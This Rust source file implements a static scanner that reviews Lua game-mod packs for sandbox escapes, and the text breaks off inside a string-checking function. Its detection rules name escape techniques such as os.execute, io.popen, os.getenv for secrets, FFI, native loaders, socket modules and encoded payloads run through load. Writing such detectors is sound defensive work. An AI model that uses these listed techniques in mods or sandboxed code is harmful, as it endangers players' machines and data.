//! Static review of mod packs before they can be enabled.
//!
//! The runtime sandbox already removes every system interface, so a finding
//! never decides whether code *can* escape; it tells the player that a pack
//! *tries* to. Precision matters more than volume: Lua is tokenized properly,
//! so comments, ordinary text, table keys, field names and local variables
//! that merely share a library's name are not reported. Only Warning and
//! Danger findings require confirmation; Info findings are advisory.
use crate::pack::PackFiles;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    Info,
    Warning,
    Danger,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Category {
    SystemCommand,
    FileSystem,
    NativeCode,
    SandboxEscape,
    DynamicCode,
    Obfuscation,
    BinaryBlob,
    Executable,
    Network,
    Compatibility,
    Syntax,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    pub category: Category,
    pub file: String,
    pub line: u32,
    pub message: String,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    /// No Warning or Danger findings.
    Clean,
    /// Unusual content a player should look at before enabling.
    Review,
    /// The pack tries to reach the operating system, native code or hidden payloads.
    Dangerous,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct ScanReport {
    pub findings: Vec<Finding>,
}

impl ScanReport {
    pub fn verdict(&self) -> Verdict {
        match self.findings.iter().map(|f| f.severity).max() {
            Some(Severity::Danger) => Verdict::Dangerous,
            Some(Severity::Warning) => Verdict::Review,
            _ => Verdict::Clean,
        }
    }
    /// Whether enabling the pack must be confirmed.
    pub fn requires_confirmation(&self) -> bool {
        self.verdict() != Verdict::Clean
    }
    pub fn count(&self, severity: Severity) -> usize {
        self.findings
            .iter()
            .filter(|f| f.severity == severity)
            .count()
    }
    fn push(
        &mut self,
        severity: Severity,
        category: Category,
        file: &str,
        line: u32,
        message: String,
    ) {
        // One file can repeat the same construct many times; report it once.
        if self
            .findings
            .iter()
            .any(|f| f.file == file && f.message == message && f.severity == severity)
        {
            return;
        }
        if self.findings.len() < 200 {
            self.findings.push(Finding {
                severity,
                category,
                file: file.to_owned(),
                line,
                message,
            });
        }
    }
    fn sort(&mut self) {
        self.findings.sort_by(|a, b| {
            b.severity
                .cmp(&a.severity)
                .then_with(|| a.file.cmp(&b.file))
                .then_with(|| a.line.cmp(&b.line))
        });
    }
}

/// Review every file in a pack.
pub fn scan_pack(pack: &PackFiles) -> ScanReport {
    let mut report = ScanReport::default();
    let modules: HashSet<String> = pack
        .files()
        .filter(|(name, _)| name.ends_with(".lua"))
        .map(|(name, _)| name.to_owned())
        .collect();
    for (name, data) in pack.files() {
        scan_file(name, data, &modules, &mut report);
    }
    report.sort();
    report
}

/// Review one Lua source file on its own.
pub fn scan_lua_source(name: &str, source: &[u8]) -> ScanReport {
    let mut report = ScanReport::default();
    let mut modules = HashSet::new();
    modules.insert(name.to_owned());
    scan_file(name, source, &modules, &mut report);
    report.sort();
    report
}

fn extension(name: &str) -> String {
    name.rsplit_once('.')
        .map(|(_, ext)| ext.to_ascii_lowercase())
        .unwrap_or_default()
}

const EXECUTABLE_EXTENSIONS: &[&str] = &[
    "exe", "dll", "sys", "scr", "com", "msi", "msp", "bat", "cmd", "ps1", "psm1", "vbs", "vbe",
    "js", "jse", "wsf", "wsh", "hta", "lnk", "cpl", "jar", "apk", "so", "dylib", "bundle", "app",
    "command", "sh", "bash", "zsh", "py", "pl", "rb", "elf", "bin", "o", "a", "lib", "node",
    "wasm", "pkg", "deb", "rpm", "appimage", "iso", "dmg",
];

fn scan_file(name: &str, data: &[u8], modules: &HashSet<String>, report: &mut ScanReport) {
    let ext = extension(name);
    if let Some(kind) = executable_magic(data) {
        report.push(
            Severity::Danger,
            Category::Executable,
            name,
            0,
            format!("contains a {kind}; mods never need programs or native libraries"),
        );
        return;
    }
    if EXECUTABLE_EXTENSIONS.contains(&ext.as_str()) {
        let script = data.starts_with(b"#!");
        report.push(
            Severity::Danger,
            Category::Executable,
            name,
            0,
            if script {
                "is a system script; mods never run shell or interpreter scripts".into()
            } else {
                format!(".{ext} files are programs or native code, which mods never need")
            },
        );
        return;
    }
    if let Some(kind) = archive_magic(data) {
        report.push(
            Severity::Warning,
            Category::BinaryBlob,
            name,
            0,
            format!("is a nested {kind} that cannot be reviewed"),
        );
        return;
    }
    match ext.as_str() {
        "lua" => {
            if data.starts_with(b"\x1bLJ") || data.starts_with(b"\x1bLua") {
                report.push(
                    Severity::Danger,
                    Category::DynamicCode,
                    name,
                    0,
                    "is precompiled bytecode that cannot be reviewed or loaded".into(),
                );
                return;
            }
            match std::str::from_utf8(data) {
                Ok(text) if !text.contains('\0') => scan_lua(name, text, modules, report),
                _ => report.push(
                    Severity::Warning,
                    Category::BinaryBlob,
                    name,
                    0,
                    "is not readable text".into(),
                ),
            }
        }
        "png" => {
            if !data.starts_with(b"\x89PNG\r\n\x1a\n") {
                report.push(
                    Severity::Warning,
                    Category::BinaryBlob,
                    name,
                    0,
                    "is named like an image but is not a PNG".into(),
                );
            }
        }
        "json" => {
            if serde_json::from_slice::<serde_json::Value>(data).is_err() {
                report.push(
                    Severity::Warning,
                    Category::Syntax,
                    name,
                    0,
                    "is not valid JSON".into(),
                );
            } else if let Ok(text) = std::str::from_utf8(data) {
                scan_text_payloads(name, text, report);
            }
        }
        "wav" | "ogg" => {
            let valid = (data.starts_with(b"RIFF") && data.get(8..12) == Some(b"WAVE"))
                || data.starts_with(b"OggS");
            report.push(
                if valid {
                    Severity::Info
                } else {
                    Severity::Warning
                },
                if valid {
                    Category::Compatibility
                } else {
                    Category::BinaryBlob
                },
                name,
                0,
                if valid {
                    "audio is not used by this version and will be ignored".into()
                } else {
                    "is named like audio but its contents are not recognized".into()
                },
            );
        }
        _ => {
            if std::str::from_utf8(data).is_ok_and(|text| !text.contains('\0')) {
                if !matches!(ext.as_str(), "md" | "txt" | "" | "license" | "toml") {
                    report.push(
                        Severity::Info,
                        Category::Compatibility,
                        name,
                        0,
                        "is not used by the game and will be ignored".into(),
                    );
                }
            } else {
                report.push(
                    Severity::Warning,
                    Category::BinaryBlob,
                    name,
                    0,
                    "contains unidentifiable binary data".into(),
                );
            }
        }
    }
}

fn executable_magic(data: &[u8]) -> Option<&'static str> {
    let magic = |bytes: &[u8]| data.starts_with(bytes);
    if magic(b"MZ") && data.len() > 0x40 {
        return Some("Windows program (PE)");
    }
    if magic(b"\x7fELF") {
        return Some("Linux program or library (ELF)");
    }
    if magic(b"\xfe\xed\xfa\xce")
        || magic(b"\xfe\xed\xfa\xcf")
        || magic(b"\xce\xfa\xed\xfe")
        || magic(b"\xcf\xfa\xed\xfe")
    {
        return Some("macOS program or library (Mach-O)");
    }
    // Universal binaries share 0xCAFEBABE with Java classes; both are code.
    if magic(b"\xca\xfe\xba\xbe") || magic(b"\xbe\xba\xfe\xca") {
        return Some("universal program or Java class");
    }
    if magic(b"\0asm") {
        return Some("WebAssembly module");
    }
    if magic(b"\x4c\x00\x00\x00\x01\x14\x02\x00") {
        return Some("Windows shortcut");
    }
    None
}

fn archive_magic(data: &[u8]) -> Option<&'static str> {
    let magic = |bytes: &[u8]| data.starts_with(bytes);
    if magic(b"PK\x03\x04") || magic(b"PK\x05\x06") {
        Some("zip archive")
    } else if magic(b"\x1f\x8b") {
        Some("gzip archive")
    } else if magic(b"7z\xbc\xaf\x27\x1c") {
        Some("7-Zip archive")
    } else if magic(b"Rar!\x1a\x07") {
        Some("RAR archive")
    } else if magic(b"\xfd7zXZ\0") {
        Some("XZ archive")
    } else if magic(b"BZh") && data.len() > 4 && data[3].is_ascii_digit() {
        Some("bzip2 archive")
    } else {
        None
    }
}

// --------------------------------------------------------------------------
// Lua tokenizer

#[derive(Clone, Debug, PartialEq)]
enum Tok {
    Name(String),
    Keyword(&'static str),
    Str(Vec<u8>, u32),
    Number(Option<i64>),
    Op(&'static str),
}

struct Token {
    tok: Tok,
    line: u32,
}

const KEYWORDS: &[&str] = &[
    "and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in",
    "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while",
];
const OPERATORS: &[&str] = &[
    "...", "..", "==", "~=", "<=", ">=", "::", "+", "-", "*", "/", "%", "^", "#", "<", ">", "=",
    "(", ")", "{", "}", "[", "]", ";", ":", ",", ".", "&", "|", "~",
];

struct Lexer<'a> {
    bytes: &'a [u8],
    at: usize,
    line: u32,
}

impl<'a> Lexer<'a> {
    fn peek(&self, offset: usize) -> u8 {
        self.bytes.get(self.at + offset).copied().unwrap_or(0)
    }
    fn tokens(mut self) -> Result<Vec<Token>, (u32, &'static str)> {
        let mut tokens = Vec::new();
        if self.bytes.starts_with(b"\xef\xbb\xbf") {
            self.at = 3;
        }
        // A first line starting with `#` is a shebang the loader skips.
        if self.peek(0) == b'#' {
            while self.at < self.bytes.len() && self.peek(0) != b'\n' {
                self.at += 1;
            }
        }
        while self.at < self.bytes.len() {
            if tokens.len() > 400_000 {
                return Err((self.line, "file is too large to review"));
            }
            let c = self.peek(0);
            match c {
                b'\n' => {
                    self.line += 1;
                    self.at += 1;
                }
                b' ' | b'\t' | b'\r' | 0x0b | 0x0c => self.at += 1,
                b'-' if self.peek(1) == b'-' => {
                    self.at += 2;
                    if self.peek(0) == b'['
                        && let Some(level) = self.long_bracket_level()
                    {
                        self.long_string(level)?;
                    } else {
                        while self.at < self.bytes.len() && self.peek(0) != b'\n' {
                            self.at += 1;
                        }
                    }
                }
                b'[' if self.long_bracket_level().is_some() => {
                    let line = self.line;
                    let level = self.long_bracket_level().unwrap();
                    let text = self.long_string(level)?;
                    tokens.push(Token {
                        tok: Tok::Str(text, 0),
                        line,
                    });
                }
                b'"' | b'\'' => {
                    let line = self.line;
                    let (text, escapes) = self.quoted(c)?;
                    tokens.push(Token {
                        tok: Tok::Str(text, escapes),
                        line,
                    });
                }
                b'0'..=b'9' => tokens.push(Token {
                    tok: Tok::Number(self.number()),
                    line: self.line,
                }),
                b'.' if self.peek(1).is_ascii_digit() => tokens.push(Token {
                    tok: Tok::Number(self.number()),
                    line: self.line,
                }),
                c if c == b'_' || c.is_ascii_alphabetic() || c >= 0x80 => {
                    let start = self.at;
                    while {
                        let c = self.peek(0);
                        c == b'_' || c.is_ascii_alphanumeric() || c >= 0x80
                    } {
                        self.at += 1;
                    }
                    let word = String::from_utf8_lossy(&self.bytes[start..self.at]).into_owned();
                    let tok = match KEYWORDS.iter().find(|k| **k == word) {
                        Some(keyword) => Tok::Keyword(keyword),
                        None => Tok::Name(word),
                    };
                    tokens.push(Token {
                        tok,
                        line: self.line,
                    });
                }
                _ => {
                    let rest = &self.bytes[self.at..];
                    let Some(op) = OPERATORS.iter().find(|op| rest.starts_with(op.as_bytes()))
                    else {
                        return Err((self.line, "unexpected character"));
                    };
                    self.at += op.len();
                    tokens.push(Token {
                        tok: Tok::Op(op),
                        line: self.line,
                    });
                }
            }
        }
        Ok(tokens)
    }
    fn long_bracket_level(&self) -> Option<usize> {
        let mut level = 0;
        while self.peek(1 + level) == b'=' {
            level += 1;
        }
        (self.peek(1 + level) == b'[').then_some(level)
    }
    fn long_string(&mut self, level: usize) -> Result<Vec<u8>, (u32, &'static str)> {
        self.at += level + 2;
        if self.peek(0) == b'\r' {
            self.at += 1;
        }
        if self.peek(0) == b'\n' {
            self.line += 1;
            self.at += 1;
        }
        let start = self.at;
        while self.at < self.bytes.len() {
            if self.peek(0) == b']'
                && (1..=level).all(|i| self.peek(i) == b'=')
                && self.peek(level + 1) == b']'
            {
                let text = self.bytes[start..self.at].to_vec();
                self.at += level + 2;
                return Ok(text);
            }
            if self.peek(0) == b'\n' {
                self.line += 1;
            }
            self.at += 1;
        }
        Err((self.line, "unfinished long string or comment"))
    }
    fn quoted(&mut self, quote: u8) -> Result<(Vec<u8>, u32), (u32, &'static str)> {
        self.at += 1;
        let mut text = Vec::new();
        let mut escapes = 0;
        loop {
            let c = self.peek(0);
            if self.at >= self.bytes.len() || c == b'\n' {
                return Err((self.line, "unfinished string"));
            }
            self.at += 1;
            if c == quote {
                return Ok((text, escapes));
            }
            if c != b'\\' {
                text.push(c);
                continue;
            }
            let e = self.peek(0);
            self.at += 1;
            match e {
                b'n' => text.push(b'\n'),
                b't' => text.push(b'\t'),
                b'r' => text.push(b'\r'),
                b'a' => text.push(7),
                b'b' => text.push(8),
                b'f' => text.push(12),
                b'v' => text.push(11),
                b'\n' => {
                    self.line += 1;
                    if self.peek(0) == b'\r' {
                        self.at += 1;
                    }
                    text.push(b'\n');
                }
                b'\r' => {
                    self.line += 1;
                    if self.peek(0) == b'\n' {
                        self.at += 1;
                    }
                    text.push(b'\n');
                }
                b'z' => {
                    while matches!(self.peek(0), b' ' | b'\t' | b'\r' | b'\n') {
                        if self.peek(0) == b'\n' {
                            self.line += 1;
                        }
                        self.at += 1;
                    }
                }
                b'x' => {
                    escapes += 1;
                    let digits = [self.peek(0), self.peek(1)];
                    let value = std::str::from_utf8(&digits)
                        .ok()
                        .and_then(|d| u8::from_str_radix(d, 16).ok())
                        .ok_or((self.line, "invalid hexadecimal escape"))?;
                    self.at += 2;
                    text.push(value);
                }
                b'u' if self.peek(0) == b'{' => {
                    escapes += 1;
                    self.at += 1;
                    let start = self.at;
                    while self.peek(0).is_ascii_hexdigit() && self.at - start < 8 {
                        self.at += 1;
                    }
                    let value = std::str::from_utf8(&self.bytes[start..self.at])
                        .ok()
                        .and_then(|d| u32::from_str_radix(d, 16).ok())
                        .and_then(char::from_u32)
                        .ok_or((self.line, "invalid unicode escape"))?;
                    if self.peek(0) != b'}' {
                        return Err((self.line, "invalid unicode escape"));
                    }
                    self.at += 1;
                    let mut buffer = [0; 4];
                    text.extend_from_slice(value.encode_utf8(&mut buffer).as_bytes());
                }
                b'0'..=b'9' => {
                    escapes += 1;
                    let mut value = u32::from(e - b'0');
                    for _ in 0..2 {
                        if self.peek(0).is_ascii_digit() {
                            value = value * 10 + u32::from(self.peek(0) - b'0');
                            self.at += 1;
                        }
                    }
                    text.push(u8::try_from(value).map_err(|_| (self.line, "invalid escape"))?);
                }
                0 => return Err((self.line, "unfinished string")),
                other => text.push(other),
            }
        }
    }
    fn number(&mut self) -> Option<i64> {
        let start = self.at;
        let hex = self.peek(0) == b'0' && matches!(self.peek(1), b'x' | b'X');
        if hex {
            self.at += 2;
        }
        loop {
            let c = self.peek(0);
            let exponent = if hex {
                matches!(c, b'p' | b'P')
            } else {
                matches!(c, b'e' | b'E')
            };
            if exponent && matches!(self.peek(1), b'+' | b'-') {
                self.at += 2;
            } else if c.is_ascii_alphanumeric() || c == b'.' || c == b'_' {
                self.at += 1;
            } else {
                break;
            }
        }
        let text = std::str::from_utf8(&self.bytes[start..self.at]).ok()?;
        let digits = text.trim_end_matches(['L', 'U', 'l', 'u', 'i']);
        if hex {
            i64::from_str_radix(&digits[2..], 16).ok()
        } else {
            digits.parse().ok()
        }
    }
}

// --------------------------------------------------------------------------
// Lua analysis

/// Modules that only exist to reach outside a sandbox.
const SYSTEM_MODULES: &[(&str, &str)] = &[
    ("ffi", "native code through the LuaJIT FFI"),
    ("jit", "the JIT compiler controls"),
    ("os", "the operating system library"),
    ("io", "the file and process library"),
    ("debug", "the debug library"),
    ("package", "the native module loader"),
    ("socket", "network sockets"),
    ("socket.http", "web requests"),
    ("socket.core", "network sockets"),
    ("ssl", "encrypted network connections"),
    ("ssl.https", "web requests"),
    ("lfs", "the file system"),
    ("posix", "POSIX system calls"),
    ("winapi", "the Windows API"),
    ("alien", "native code"),
    ("luacom", "Windows COM automation"),
    ("ltn12", "network streams"),
    ("mime", "network encodings"),
    ("http.request", "web requests"),
];

#[derive(Default)]
struct Context {
    os_exec: bool,
    loader: bool,
    payload: bool,
}

struct Analyzer<'r> {
    file: &'r str,
    report: &'r mut ScanReport,
    tokens: Vec<Token>,
    modules: &'r HashSet<String>,
    context: Context,
}

fn scan_lua(name: &str, text: &str, modules: &HashSet<String>, report: &mut ScanReport) {
    let tokens = match (Lexer {
        bytes: text.as_bytes(),
        at: 0,
        line: 1,
    })
    .tokens()
    {
        Ok(tokens) => tokens,
        Err((line, message)) => {
            // LuaJIT rejects the same input, but a file that cannot be read in
            // full must never pass as reviewed.
            report.push(
                Severity::Warning,
                Category::Syntax,
                name,
                line,
                format!("could not be fully reviewed: {message}"),
            );
            return;
        }
    };
    let mut analyzer = Analyzer {
        file: name,
        report,
        tokens,
        modules,
        context: Context::default(),
    };
    analyzer.run();
    if text.lines().any(|line| line.len() > 4000) {
        analyzer.report.push(
            Severity::Info,
            Category::Obfuscation,
            name,
            0,
            "has extremely long lines (minified or generated code)".into(),
        );
    }
    let context = &analyzer.context;
    if context.loader && context.payload {
        analyzer.report.push(
            Severity::Danger,
            Category::Obfuscation,
            name,
            0,
            "decodes data and runs it as code, a common way to hide malware".into(),
        );
    }
    if context.os_exec && context.payload {
        analyzer.report.push(
            Severity::Danger,
            Category::Obfuscation,
            name,
            0,
            "combines system commands with an encoded payload".into(),
        );
    }
}

impl Analyzer<'_> {
    fn name_at(&self, index: usize) -> Option<&str> {
        match self.tokens.get(index).map(|t| &t.tok) {
            Some(Tok::Name(name)) => Some(name),
            _ => None,
        }
    }
    fn op_at(&self, index: usize, op: &str) -> bool {
        matches!(self.tokens.get(index).map(|t| &t.tok), Some(Tok::Op(o)) if *o == op)
    }
    fn keyword_at(&self, index: usize, keyword: &str) -> bool {
        matches!(self.tokens.get(index).map(|t| &t.tok), Some(Tok::Keyword(k)) if *k == keyword)
    }
    fn string_at(&self, index: usize) -> Option<&[u8]> {
        match self.tokens.get(index).map(|t| &t.tok) {
            Some(Tok::Str(text, _)) => Some(text),
            _ => None,
        }
    }
    fn line(&self, index: usize) -> u32 {
        self.tokens.get(index).map_or(0, |t| t.line)
    }

    fn run(&mut self) {
        let mut scopes: Vec<HashSet<String>> = vec![HashSet::new()];
        let mut brackets: Vec<&'static str> = Vec::new();
        let mut pending: Vec<String> = Vec::new();
        let mut pending_depth = 0;
        let mut pending_line = 0;
        let mut for_names: Vec<String> = Vec::new();
        let mut collecting_for = false;
        let mut function_open = false;
        let mut params_depth: Option<usize> = None;
        let mut close_at_newline = false;
        let mut previous_line = 0;
        let mut array_run = 0_usize;
        let mut array_bytes = true;
        let count = self.tokens.len();
        let mut i = 0;
        while i < count {
            let line = self.line(i);
            if line > previous_line {
                if close_at_newline && brackets.is_empty() && scopes.len() > 1 {
                    scopes.pop();
                    close_at_newline = false;
                }
                previous_line = line;
            }
            // `local a, b = expr` declares after the expression: commit at the
            // next statement on a later line once brackets are balanced.
            if !pending.is_empty()
                && line > pending_line
                && brackets.len() <= pending_depth
                && i > 0
                && !continues_expression(&self.tokens[i - 1].tok)
                && !continuation_start(&self.tokens[i].tok)
            {
                scopes.last_mut().unwrap().extend(pending.drain(..));
            }
            let token = self.tokens[i].tok.clone();
            match &token {
                Tok::Keyword(keyword) => match *keyword {
                    "local" => {
                        if self.keyword_at(i + 1, "function") {
                            if let Some(name) = self.name_at(i + 2) {
                                scopes.last_mut().unwrap().insert(name.to_owned());
                            }
                            i += 1;
                            continue;
                        }
                        let mut j = i + 1;
                        let mut names = Vec::new();
                        while let Some(name) = self.name_at(j) {
                            names.push(name.to_owned());
                            if self.op_at(j + 1, ",") {
                                j += 2;
                            } else {
                                j += 1;
                                break;
                            }
                        }
                        if self.op_at(j, "=") {
                            pending.extend(names);
                            pending_depth = brackets.len();
                            pending_line = self.line(j);
                        } else {
                            scopes.last_mut().unwrap().extend(names);
                        }
                        i = j;
                        continue;
                    }
                    "for" => {
                        collecting_for = true;
                        for_names.clear();
                    }
                    "in" => collecting_for = false,
                    "function" => {
                        scopes.push(HashSet::new());
                        function_open = true;
                    }
                    "do" | "then" | "repeat" => {
                        collecting_for = false;
                        let mut scope = HashSet::new();
                        if *keyword == "do" {
                            scope.extend(for_names.drain(..));
                        }
                        scopes.push(scope);
                    }
                    "elseif" => {
                        if scopes.len() > 1 {
                            scopes.pop();
                        }
                    }
                    "else" => {
                        if scopes.len() > 1 {
                            scopes.pop();
                        }
                        scopes.push(HashSet::new());
                    }
                    "end" => {
                        if scopes.len() > 1 {
                            scopes.pop();
                        }
                    }
                    "until" => close_at_newline = true,
                    _ => {}
                },
                Tok::Op(op) => {
                    match *op {
                        "(" => {
                            if function_open && params_depth.is_none() {
                                params_depth = Some(brackets.len() + 1);
                                // `function t:m()` receives an implicit self.
                                if i >= 2 && self.op_at(i - 2, ":") {
                                    scopes.last_mut().unwrap().insert("self".into());
                                }
                            }
                            brackets.push("(");
                        }
                        "{" => {
                            brackets.push("{");
                            array_run = 0;
                            array_bytes = true;
                        }
                        "[" => brackets.push("["),
                        ")" | "]" | "}" => {
                            if *op == ")" && params_depth == Some(brackets.len()) {
                                params_depth = None;
                                function_open = false;
                            }
                            if *op == "}" {
                                self.check_array(array_run, array_bytes, i);
                                array_run = 0;
                            }
                            brackets.pop();
                        }
                        "=" if collecting_for => collecting_for = false,
                        _ => {}
                    }
                }
                Tok::Number(value) => {
                    if brackets.last() == Some(&"{") {
                        array_run += 1;
                        array_bytes &= value.is_some_and(|v| (0..=255).contains(&v));
                    }
                }
                Tok::Str(text, escapes) => {
                    array_bytes = false;
                    self.check_string(text, *escapes, i);
                    // `t["execute"](...)`: a system function selected by name.
                    if i > 0
                        && self.op_at(i - 1, "[")
                        && self.op_at(i + 1, "]")
                        && !self.op_at(i + 2, "=")
                        && let Ok(member) = std::str::from_utf8(text)
                        && SYSTEM_FUNCTIONS.contains(&member)
                    {
                        let line = self.line(i);
                        self.warning(
                            Category::SandboxEscape,
                            line,
                            &format!("selects the system function \"{member}\" by name"),
                        );
                    }
                }
                Tok::Name(name) => {
                    if params_depth.is_some() {
                        scopes.last_mut().unwrap().insert(name.clone());
                    } else if collecting_for {
                        for_names.push(name.clone());
                    } else if self.is_reference(i, &brackets) {
                        // Pending names are not visible until their statement ends.
                        if !scopes.iter().any(|scope| scope.contains(name)) {
                            self.global(i, name);
                        }
                    }
                }
            }
            i += 1;
        }
    }

    fn is_reference(&self, i: usize, brackets: &[&str]) -> bool {
        if i > 0 {
            match &self.tokens[i - 1].tok {
                Tok::Op(".") | Tok::Op(":") | Tok::Op("::") | Tok::Keyword("goto") => {
                    return false;
                }
                _ => {}
            }
        }
        if self.op_at(i + 1, "::") {
            return false;
        }
        // `{ os = 1 }` names a table field, not the global.
        if brackets.last() == Some(&"{")
            && self.op_at(i + 1, "=")
            && i > 0
            && matches!(
                self.tokens[i - 1].tok,
                Tok::Op("{") | Tok::Op(",") | Tok::Op(";")
            )
        {
            return false;
        }
        true
    }

    fn member(&self, i: usize) -> Option<String> {
        if self.op_at(i + 1, ".") || self.op_at(i + 1, ":") {
            return self.name_at(i + 2).map(str::to_owned);
        }
        if self.op_at(i + 1, "[") && self.op_at(i + 3, "]") {
            return self
                .string_at(i + 2)
                .map(|text| String::from_utf8_lossy(text).into_owned());
        }
        None
    }

    fn call_string_argument(&self, i: usize) -> Option<String> {
        let text = if self.op_at(i + 1, "(") {
            self.string_at(i + 2)
        } else {
            self.string_at(i + 1)
        }?;
        Some(String::from_utf8_lossy(text).into_owned())
    }

    fn global(&mut self, i: usize, name: &str) {
        let line = self.line(i);
        let file = self.file;
        match name {
            "os" => {
                let member = self.member(i);
                match member.as_deref() {
                    Some("execute") => {
                        self.context.os_exec = true;
                        self.danger(
                            Category::SystemCommand,
                            line,
                            "runs system commands (os.execute)",
                        );
                    }
                    Some("exit") => self.danger(
                        Category::SystemCommand,
                        line,
                        "tries to close the game process (os.exit)",
                    ),
                    Some("remove") | Some("rename") | Some("tmpname") => self.danger(
                        Category::FileSystem,
                        line,
                        &format!("changes files on your computer (os.{})", member.unwrap()),
                    ),
                    Some("getenv") => self.danger(
                        Category::SandboxEscape,
                        line,
                        "reads environment variables, which can contain secrets (os.getenv)",
                    ),
                    Some("setlocale") => self.warning(
                        Category::SandboxEscape,
                        line,
                        "changes process settings (os.setlocale)",
                    ),
                    Some("time") | Some("clock") | Some("date") | Some("difftime") => self.info(
                        Category::Compatibility,
                        line,
                        "uses the os clock, which is unavailable; use tankyard.time()",
                    ),
                    _ => self.warning(
                        Category::SandboxEscape,
                        line,
                        "accesses the operating system library (os)",
                    ),
                }
            }
            "io" => {
                let member = self.member(i);
                match member.as_deref() {
                    Some("popen") => {
                        self.context.os_exec = true;
                        self.danger(
                            Category::SystemCommand,
                            line,
                            "runs system commands (io.popen)",
                        );
                    }
                    Some("open") | Some("lines") | Some("input") | Some("output")
                    | Some("tmpfile") | Some("close") => self.danger(
                        Category::FileSystem,
                        line,
                        &format!(
                            "reads or writes files on your computer (io.{})",
                            member.unwrap()
                        ),
                    ),
                    Some("write") | Some("read") | Some("stdout") | Some("stderr")
                    | Some("stdin") => self.warning(
                        Category::FileSystem,
                        line,
                        "uses console input/output (io); use print()",
                    ),
                    _ => self.warning(
                        Category::FileSystem,
                        line,
                        "accesses the file and process library (io)",
                    ),
                }
            }
            "ffi" => self.danger(
                Category::NativeCode,
                line,
                "uses the LuaJIT FFI to call native code",
            ),
            "jit" => self.info(
                Category::Compatibility,
                line,
                "uses JIT compiler controls, which the sandbox ignores",
            ),
            "debug" => {
                let member = self.member(i);
                match member.as_deref() {
                    Some("traceback") | Some("getinfo") => self.info(
                        Category::Compatibility,
                        line,
                        "uses debug helpers, which are unavailable in the sandbox",
                    ),
                    _ => self.danger(
                        Category::SandboxEscape,
                        line,
                        &format!(
                            "uses debug.{} to inspect or alter the interpreter",
                            member.unwrap_or_else(|| "*".into())
                        ),
                    ),
                }
            }
            "package" => {
                let member = self.member(i);
                match member.as_deref() {
                    Some("loadlib") => self.danger(
                        Category::NativeCode,
                        line,
                        "loads native libraries (package.loadlib)",
                    ),
                    Some("cpath") | Some("searchers") | Some("loaders") | Some("preload") => self
                        .danger(
                            Category::NativeCode,
                            line,
                            "changes how native modules are found",
                        ),
                    _ => self.warning(
                        Category::SandboxEscape,
                        line,
                        "accesses the module loader (package)",
                    ),
                }
            }
            "require" => match self.call_string_argument(i) {
                Some(module) => {
                    let path = format!("{}.lua", module.replace('.', "/"));
                    let init = format!("{}/init.lua", module.replace('.', "/"));
                    if self.modules.contains(&path) || self.modules.contains(&init) {
                        return;
                    }
                    if let Some((_, what)) = SYSTEM_MODULES.iter().find(|(m, _)| *m == module) {
                        let severity = if matches!(module.as_str(), "jit") {
                            Severity::Info
                        } else {
                            Severity::Danger
                        };
                        self.report.push(
                            severity,
                            if module.starts_with("socket")
                                || module.starts_with("http")
                                || module.starts_with("ssl")
                            {
                                Category::Network
                            } else {
                                Category::NativeCode
                            },
                            file,
                            line,
                            format!("loads {what} (require \"{module}\")"),
                        );
                    } else {
                        self.info(
                            Category::Compatibility,
                            line,
                            &format!("requires \"{module}\", which is not part of this pack"),
                        );
                    }
                }
                None => self.info(
                    Category::DynamicCode,
                    line,
                    "requires a module chosen at runtime",
                ),
            },
            "load" | "loadstring" => {
                self.context.loader = true;
                self.warning(
                    Category::DynamicCode,
                    line,
                    &format!(
                        "builds and runs code at runtime ({name}), which the sandbox does not allow"
                    ),
                );
            }
            "loadfile" | "dofile" => self.danger(
                Category::FileSystem,
                line,
                &format!("runs code from files on your computer ({name})"),
            ),
            "getfenv" | "setfenv" => self.warning(
                Category::SandboxEscape,
                line,
                &format!("changes function environments ({name})"),
            ),
            "newproxy" | "collectgarbage" | "gcinfo" => self.info(
                Category::Compatibility,
                line,
                &format!("uses {name}, which is unavailable in the sandbox"),
            ),
            "string" if self.member(i).as_deref() == Some("dump") => self.warning(
                Category::DynamicCode,
                line,
                "converts functions to bytecode (string.dump)",
            ),
            "string" if self.member(i).as_deref() == Some("char") => self.check_char_call(i),
            "_G" => {
                // `_G.os` and `_G["os"]` reach the same global; continue the
                // lookup from the token that ends the index expression.
                if let Some(member) = self.member(i) {
                    if is_system_name(&member) {
                        let end = if self.op_at(i + 1, "[") { i + 3 } else { i + 2 };
                        self.global(end, &member);
                    }
                } else if self.op_at(i + 1, "[") {
                    self.info(
                        Category::Obfuscation,
                        line,
                        "looks up globals by computed name",
                    );
                }
            }
            "rawget" => {
                if self.op_at(i + 1, "(")
                    && self.name_at(i + 2) == Some("_G")
                    && self.op_at(i + 3, ",")
                    && let Some(text) = self.string_at(i + 4)
                    && self.op_at(i + 5, ")")
                {
                    let member = String::from_utf8_lossy(text).into_owned();
                    if is_system_name(&member) {
                        self.global(i + 5, &member);
                    }
                }
            }
            _ => {}
        }
    }

    fn check_char_call(&mut self, i: usize) {
        // string.char(104, 116, 116, 112, ...) assembles hidden text.
        let mut j = i + 3;
        if !self.op_at(j, "(") {
            return;
        }
        j += 1;
        let mut numbers = 0;
        while matches!(self.tokens.get(j).map(|t| &t.tok), Some(Tok::Number(_))) {
            numbers += 1;
            if self.op_at(j + 1, ",") {
                j += 2;
            } else {
                break;
            }
        }
        if numbers >= 16 {
            self.context.payload = true;
            let line = self.line(i);
            if numbers >= 64 {
                self.warning(
                    Category::Obfuscation,
                    line,
                    "assembles a long string from character codes",
                );
            }
        }
    }

    fn check_array(&mut self, run: usize, bytes: bool, i: usize) {
        if run >= 256 && bytes {
            self.context.payload = true;
        }
        if run >= 1024 && bytes {
            let line = self.line(i);
            self.warning(
                Category::BinaryBlob,
                line,
                "embeds a large byte array (possible hidden binary)",
            );
        }
    }

    fn check_string(&mut self, text: &[u8], escapes: u32, i: usize) {
        let line = self.line(i);
